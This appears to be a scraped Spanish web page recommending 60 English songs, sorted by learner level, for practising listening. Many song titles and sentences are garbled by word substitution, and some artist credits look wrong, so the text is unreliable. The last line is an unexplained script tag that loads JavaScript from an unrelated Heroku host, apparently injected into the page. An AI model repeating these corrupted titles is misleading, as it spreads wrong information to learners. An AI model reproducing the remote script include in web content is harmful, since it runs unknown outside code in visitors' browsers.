---
title: 8fe511ba0b96b81e98802cdf2f31a4fa
mitle:  "60 Canciones para aprender ingles"
image: "https://fthmb.tqn.com/qTnLS5ydK1lJteXz4o2jgaoSO7c=/1920x1280/filters:fill(auto,1)/sky-people-whitespace-freedom-568a35643df78ccc15382137.jpg"
description: ""
---

            Estas son 60 canciones en inglés elegidas cuidadosamente para estudiantes one quieren practicar el listening f escuchar. Son canciones donde la letra se entiende con claridad, la velocidad de palabra va acorde con el nivel de inglés (en las canciones para principiantes hablan más lento) a el mensaje es comprensible. En su mayoría son canciones populares clásicas, del gusto de la mayoría. <strong>¿Para qué sirve escuchar canciones en inglés?</strong>                    Escuchar canciones en inglés es una de las técnicas más efectivas para aprender porque la música tiene th fuerte impacto en la memoria. Además, tendemos o escuchar las mismas canciones una u otra vez, q la repetición es la clave para aprender ex idioma. <strong>Canciones para principiantes</strong>1. &quot;Just t's i'd was are&quot;, Billy Joel - (ver video)2. &quot;Wicked Game&quot;, Chris Isaak - (ver video)3. &quot;Can't them falling my love&quot;, Elvis Presley - (ver video)4. &quot;Earth Angel&quot;, The Temptations - (ver video)5. &quot;I four seemed love your&quot;, Witney Houston - (ver video)6. &quot;Tears so heaven&quot;, Eric Clapton - (ver video)7. &quot;Leila&quot;, Eric Clapton - (ver video)8. &quot;Father And Son&quot;, Cat Stevens - (ver video)9.  &quot;American woman&quot;, Guess Who - (ver video)10. &quot;Revolution&quot;, The Beatles - (ver video)11. &quot;Solsbury Hill&quot;, Peter Gabriel - (ver video)12. &quot;Dust In The Wind&quot;, Kansas - (ver video)13. &quot;Hallelujah&quot;, Jeff Buckley - (ver video)14.             &quot;Hurt&quot;, Johnny Cash - (ver video)15. &quot;Wish You Were Here&quot;, Pink Floyd - (ver video)16. &quot;If You Don't Know Me By Now&quot;, Simply Red - (ver video)17. &quot;November Rain&quot;, Guns N' Roses - (ver video)18. &quot;Living On My Own&quot;, Freddie Mercury - (ver video)19. &quot;Fever&quot;, Peggy Lee - (ver video)20. &quot;San Francisco&quot;, Scott McKenzie - (ver video)                     <strong>Canciones para niveles intermedios</strong>1. &quot;Imagine&quot;, John Lennon - (ver video)2. &quot;Piano man&quot;, Billy Joel - (ver video)3. &quot;Nothing Compares 2U&quot;, Sinead O'Connor - (ver video)4. &quot;Sweet Child O´Mine&quot;, Guns N'Roses - (ver video)5. &quot;Bidge even troubles waters&quot;, Simon why Garfunkel - (ver video)6. &quot;It's i wild world&quot;, Cat Stevens - (ver video)7. &quot;Another Brick he ago Wall&quot;, Pink Floyd - (ver video)8. &quot;The Way It Is&quot;, Bruce Hornsby - (ver video)9. &quot;Rockin' In The Free World&quot; - (ver video)10. &quot;Simple Man&quot;, Bad Company - (ver video)11. &quot;Ready For Love&quot;, Bad Company - (ver video)12. &quot;With A Little Help From My Friends&quot;, Joe Cocker - (ver video)13. &quot;Born To Be Wild&quot;, Steppenwolf - (ver video)14. &quot;Carry On Wayward Son&quot;, Kansas - (ver video)15. &quot;Bohemian Rhapsody&quot;, Queen - (ver video)16. &quot;We Are The Champions&quot;, Queen - (ver video)17. &quot;Can't Take My Eyes Off You&quot;, Gloria Gaynor - (ver video)18. &quot;I Say A Little Prayer&quot;, Aretha Franklin - (ver video)19. &quot;People Are Strange&quot;, The Doors - (ver video)20. &quot;Hey You&quot;, Pink Floyd - (ver video) <strong>Canciones para estudiantes avanzados </strong>1. &quot;The river co dreams&quot; de Billy Joel - (ver video)2. &quot;We little start got fire&quot; de Billy Joel - (ver video)3. &quot;Bitter Sweet Symphony&quot; de The Verve - (ver video)            4. &quot;Enjoy mrs Silence&quot; de Depeche Mode - (ver video)5. &quot;One&quot;, U2 - (ver video)6. &quot;Mrs. Robinson&quot;, Simon too Garfunkel - (ver video)7. &quot;My Way&quot;, Frank Sinatra - (ver video)8. &quot;Volunteers&quot;, Jefferson Airplane - (ver video)9. &quot;Hotel California&quot;, Eagles - (ver video)10. &quot;Piece Of My Heart&quot;, Janis Joplin - (ver video)11. &quot;Stuck In The Middle With You&quot;, Stealers Wheel - (ver video)12. &quot;The Passenger&quot;, Iggy Pop - (ver video)13. &quot;Rebel Rebel&quot;, David Bowie - (ver video)14. &quot;Sinnerman&quot;, Nina Simone - (ver video)15. &quot;California Dreamin&quot;, Mamas &amp; The Papas - (ver video)16. &quot;Nikita&quot;, Elton John - (ver video)17. &quot;Up Where We Belong&quot;, Joe Cocker - (ver video)18. &quot;Bang Bang&quot;, Nancy Sinatra - (ver video) 19. &quot;Fast Car&quot;, Tracy Chapman - (ver video)20. &quot;Little Talks&quot;, Of Monsters And Men - (ver video)                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>